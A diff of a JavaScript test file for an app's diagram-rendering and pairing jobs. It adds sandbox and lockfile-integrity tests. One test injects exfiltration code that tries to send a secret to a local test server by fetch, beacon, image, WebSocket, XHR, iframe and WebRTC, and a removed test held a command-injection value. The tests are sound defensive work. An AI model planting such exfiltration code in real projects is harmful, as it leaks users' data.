@@ -74,15 +74,18 @@ describe("review frames", () => {
 
 describe("pairing data", () => {
   it("keeps absent, null and text step fields exactly, as the app fingerprints them", () => {
-    const { diagrams } = mapPlan({ diagrams: [{ id: "abg", title: "t", facts: [], steps: [{ key: "a", caption: "c" }, { key: "w", dynamic: true, caption: null }] }], proposals: {} });
+    const { diagrams } = mapPlan({ diagrams: [{ id: "abg", title: "t", facts: [], steps: [{ key: "a", caption: "c" }, { key: "w", dynamic: true, caption: null }] }] });
     expect(diagrams.abg.steps).toEqual([{ key: "a", caption: "c" }, { key: "w", dynamic: true, caption: null }]);
     expect("narration" in diagrams.abg.steps[0]).toBe(false);
   });
-  it("refuses proposals for unknown diagrams or odd question ids", () => {
-    const base = { diagrams: [{ id: "abg", title: "t", facts: [], steps: [] }] };
-    expect(() => mapPlan({ ...base, proposals: { 12: [{ d: "insulin" }] } })).toThrow(/unknown diagram/);
-    expect(() => mapPlan({ ...base, proposals: { "12; rm": [{ d: "abg" }] } })).toThrow(/not a number/);
-    expect(mapPlan({ ...base, proposals: { 12: [{ d: "abg", p: { ph: 7.3 } }] } }).proposals.get(12)).toEqual([{ d: "abg", p: { ph: 7.3 } }]);
+  /* Luna, PR #155: proposals came from the branch's matcher, which was shown
+     the bank and could hide questions in them. The paid job now proposes
+     pairings itself, so a prepared file carrying any is refused. */
+  it("refuses a prepared pairing file that carries proposals", () => {
+    const base = { diagrams: [{ id: "abg", title: "t", facts: [], steps: [{ key: "a", caption: "c" }] }] };
+    expect(() => mapPlan({ ...base, proposals: {} })).toThrow(/diagrams only/);
+    expect(() => mapPlan({ ...base, proposals: { 12: [{ d: "abg", p: { leak: "SECRET STEM" } }] } })).toThrow(/diagrams only/);
+    expect(Object.keys(mapPlan(base).diagrams)).toEqual(["abg"]);
   });
 });
 
@@ -211,6 +214,7 @@ describe("frames are rendered from the source tree by the trusted renderer", () 
     const root = mkdtempSync(join(tmpdir(), "render-src-"));
     cpSync("src", join(root, "src"), { recursive: true });
     cpSync("package.json", join(root, "package.json"));
+    cpSync("package-lock.json", join(root, "package-lock.json"));
     const abg = join(root, "src/diagrams/abg.jsx");
     // the title says where the diagram code actually ran
     writeFileSync(abg, readFileSync(abg, "utf8").replace('title: "Reading an ABG"', 'title: typeof process === "undefined" ? "ABG drawn in the browser" : "ABG drawn in Node"'));
@@ -257,6 +261,7 @@ describe("the pairing and narration jobs read the source through the sandbox", (
     const root = mkdtempSync(join(tmpdir(), "sandbox-src-"));
     cpSync("src", join(root, "src"), { recursive: true });
     cpSync("package.json", join(root, "package.json"));
+    cpSync("package-lock.json", join(root, "package-lock.json"));
     edit(root);
     git(root, "init", "-q"); git(root, "add", "-A");
     git(root, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "source");
@@ -264,23 +269,38 @@ describe("the pairing and narration jobs read the source through the sandbox", (
   };
   const editFile = (root, rel, f) => writeFileSync(join(root, rel), f(readFileSync(join(root, rel), "utf8")));
 
-  it("runs the source's own matcher and reads its own words", async () => {
+  it("reads the source's own words, and offers its code no questions", async () => {
     const { withSandbox } = await import("../ops/render-diagrams.mjs");
-    const { proposePairs } = await import("../src/diagrams/match.js");
-    const q = { id: 1, stem: "The client's potassium is 6.2 mEq/L. Which finding is expected?", options: ["a", "b"], answer: "a", rationale: "Peaked T waves." };
-    const here = await withSandbox(".", (call) => call("propose", [q]));
-    expect(here["1"]).toEqual(proposePairs(q).map((x) => (x.p == null ? { d: x.d } : { d: x.d, p: x.p })));
-    // a source whose matcher reads nothing, and whose ABG step says other words
-    const root = source((r) => {
-      editFile(r, "src/diagrams/match.js", (t) => t.replace("export function proposePairs(item) {", "export function proposePairs(item) {\n  return [];"));
-      editFile(r, "src/diagrams/abg.jsx", (t) => t.replace("Start with the pH. Anything below", "Begin with the pH. Anything below"));
-    });
+    const root = source((r) => editFile(r, "src/diagrams/abg.jsx", (t) => t.replace("Start with the pH. Anything below", "Begin with the pH. Anything below")));
     try {
-      const got = await withSandbox(root, async (call) => ({ p: await call("propose", [q]), abg: await call("raw", "abg") }));
-      expect(got.p["1"]).toEqual([]);
+      const got = await withSandbox(root, async (call) => ({ abg: await call("raw", "abg"), propose: await call("propose", [{ id: 1, stem: "s" }]).then(() => "ran", (e) => String(e)) }));
       expect(got.abg.steps[0].narration).toMatch(/^Begin with the pH/);
       expect(got.abg.steps.find((s) => s.dynamic)).toBeTruthy();
+      // Luna, PR #155: there is no way to hand the source's code a question
+      expect(got.propose).toMatch(/not a function/);
     } finally { rmSync(root, { recursive: true, force: true }); }
+  }, 300_000);
+
+  it("prepares the pairing file from diagrams alone, never touching the bank", async () => {
+    const { createServer } = await import("node:http");
+    const hits = [];
+    const server = createServer((req, res) => { hits.push(req.url); res.end("[]"); });
+    await new Promise((r) => server.listen(0, "127.0.0.1", r));
+    const root = source(() => {});
+    const out = join(mkdtempSync(join(tmpdir(), "map-out-")), "map.json");
+    try {
+      const env = { ...process.env, PULSERN_SUPABASE_URL: `http://127.0.0.1:${server.address().port}`, PULSERN_BANK_READER_EMAIL: "r@example.com", PULSERN_BANK_READER_PASSWORD: "p" };
+      const r = await new Promise((done) => {
+        const c = require("node:child_process").spawn(process.execPath, ["ops/map-diagrams.mjs", "--prepare", out, "--source", root], { env });
+        let o = ""; c.stdout.on("data", (b) => (o += b)); c.stderr.on("data", (b) => (o += b));
+        c.on("close", (code) => done({ code, o }));
+      });
+      expect(r.code, r.o).toBe(0);
+      expect(hits, "the prepare job made no bank request").toEqual([]);
+      const plan = JSON.parse(readFileSync(out, "utf8"));
+      expect(Object.keys(plan).sort()).toEqual(["commit", "diagrams", "kind"]);
+      expect(Object.keys(mapPlan(plan).diagrams)).toContain("abg");
+    } finally { server.close(); rmSync(root, { recursive: true, force: true }); }
   }, 300_000);
 
   it("prepares the narration plan from the source tree, at its commit, and refuses a dirty tree", () => {
@@ -324,5 +344,93 @@ describe("a narration dry run changes nothing", () => {
     expect(r.stdout).toMatch(/nothing is changed/);
     expect(readFileSync(join(into, "src/diagrams/narration.json"), "utf8")).toBe(populated);
     rmSync(d, { recursive: true, force: true });
+  }, 180_000);
+});
+
+/* Astra, PR #134 review, final round: the renderer drew with its own
+   installed packages even when the tree pinned different ones. */
+describe("the renderer draws only with the tree's own packages", () => {
+  it("names every package whose version or integrity differs", async () => {
+    const { packageMismatches } = await import("../ops/render-diagrams.mjs");
+    const d = mkdtempSync(join(tmpdir(), "locks-"));
+    const lock = (react) => JSON.stringify({ packages: { "node_modules/react": react, "node_modules/react-dom": { version: "18.3.1", integrity: "sha512-x" } } });
+    writeFileSync(join(d, "ours.json"), lock({ version: "18.3.1", integrity: "sha512-a" }));
+    writeFileSync(join(d, "same.json"), lock({ version: "18.3.1", integrity: "sha512-a" }));
+    writeFileSync(join(d, "newer.json"), lock({ version: "19.0.0", integrity: "sha512-b" }));
+    writeFileSync(join(d, "tampered.json"), lock({ version: "18.3.1", integrity: "sha512-c" }));
+    const names = new Set(["react", "react-dom"]);
+    expect(packageMismatches(join(d, "ours.json"), join(d, "same.json"), names)).toEqual([]);
+    expect(packageMismatches(join(d, "ours.json"), join(d, "newer.json"), names)).toEqual(["react 19.0.0 in the tree, 18.3.1 in the renderer"]);
+    expect(packageMismatches(join(d, "ours.json"), join(d, "tampered.json"), names)).toHaveLength(1);
+    expect(packageMismatches(join(d, "ours.json"), join(d, "absent.json"), names)[0]).toMatch(/missing or unreadable/);
+    rmSync(d, { recursive: true, force: true });
+  });
+  it("refuses to render a tree that upgraded React", async () => {
+    const { bundleDiagrams } = await import("../ops/render-diagrams.mjs");
+    const { cpSync } = require("node:fs");
+    const root = mkdtempSync(join(tmpdir(), "render-deps-"));
+    try {
+      cpSync("src", join(root, "src"), { recursive: true });
+      cpSync("package.json", join(root, "package.json"));
+      const lock = JSON.parse(readFileSync("package-lock.json", "utf8"));
+      lock.packages["node_modules/react"] = { ...lock.packages["node_modules/react"], version: "19.0.0", integrity: "sha512-other" };
+      writeFileSync(join(root, "package-lock.json"), JSON.stringify(lock));
+      await expect(bundleDiagrams(root)).rejects.toThrow(/react 19\.0\.0 in the tree/);
+      cpSync("package-lock.json", join(root, "package-lock.json"));
+      await expect(bundleDiagrams(root)).resolves.toMatch(/__pulsern/);
+    } finally { rmSync(root, { recursive: true, force: true }); }
+  }, 120_000);
+});
+
+/* Luna, PR #155 review: the pairing job hands practice questions to the
+   branch's matcher in the browser, and nothing stopped that code sending
+   them out. The sandbox page now has no network at all. */
+describe("the sandbox cannot send anything out", () => {
+  it("blocks fetch, beacons, images, sockets and WebRTC from branch code", async () => {
+    const { createServer } = await import("node:http");
+    const { cpSync } = require("node:fs");
+    const hits = [];
+    const server = createServer((req, res) => { hits.push(req.url); res.end("ok"); });
+    await new Promise((r) => server.listen(0, "127.0.0.1", r));
+    const url = `http://127.0.0.1:${server.address().port}`;
+    const root = mkdtempSync(join(tmpdir(), "exfil-"));
+    /* Direct connections, so the control below proves the server is
+       reachable from this browser and the sandbox result means something. */
+    const proxy = { HTTPS_PROXY: process.env.HTTPS_PROXY, https_proxy: process.env.https_proxy };
+    delete process.env.HTTPS_PROXY; delete process.env.https_proxy;
+    try {
+      cpSync("src", join(root, "src"), { recursive: true });
+      cpSync("package.json", join(root, "package.json"));
+      cpSync("package-lock.json", join(root, "package-lock.json"));
+      const m = join(root, "src/diagrams/index.js");
+      writeFileSync(m, readFileSync(m, "utf8") + `
+setTimeout(() => {
+  const leak = "SECRET";
+  try { fetch("${url}/fetch?" + leak).catch(() => {}); } catch {}
+  try { navigator.sendBeacon("${url}/beacon", leak); } catch {}
+  try { new Image().src = "${url}/img?" + leak; } catch {}
+  try { const ws = new WebSocket("${url.replace("http", "ws")}/ws"); } catch {}
+  try { const x = new XMLHttpRequest(); x.open("GET", "${url}/xhr?" + leak); x.send(); } catch {}
+  try { const f = document.createElement("iframe"); f.src = "${url}/frame?" + leak; document.body.appendChild(f); } catch {}
+  try { new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${server.address().port}" }] }); } catch {}
+}, 0);
+`);
+      const { withSandbox } = await import("../ops/render-diagrams.mjs");
+      const out = await withSandbox(root, async (call) => {
+        const ids = await call("ids");
+        await new Promise((r) => setTimeout(r, 1500));
+        return ids;
+      });
+      expect(out).toContain("abg");   // the branch's code still ran
+      expect(hits, "nothing left the sandbox").toEqual([]);
+      // control: an ordinary page in the same browser can reach the server
+      const { launchBrowser } = await import("../ops/browser.mjs");
+      const b = await launchBrowser();
+      try { const pg = await (await b.newContext()).newPage(); await pg.goto(`${url}/control`); } finally { await b.close(); }
+      expect(hits).toContain("/control");
+    } finally {
+      for (const [k, v] of Object.entries(proxy)) if (v !== undefined) process.env[k] = v;
+      server.close(); rmSync(root, { recursive: true, force: true });
+    }
   }, 180_000);
 });
